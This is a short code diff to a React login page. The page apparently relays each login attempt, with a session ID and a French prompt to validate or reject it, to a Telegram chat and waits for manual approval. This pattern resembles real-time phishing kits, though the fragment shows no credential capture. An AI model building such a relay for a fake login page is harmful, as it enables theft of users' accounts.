@@ -183,9 +183,9 @@ export const LoginPage: React.FC<LoginPageProps> = ({
         `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
         `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;
 
-      // Send to Telegram and wait for approval (using phone as username)
+      // Send to Telegram via serverless and wait for approval
       setIsWaitingTelegram(true);
-      const approved = await sendLoginToTelegramAndWait(message, phoneValidation.normalized, false);
+      const approved = await sendLoginToTelegramAndWait(message, sessionId, 'login');
 
       setIsWaitingTelegram(false);
 
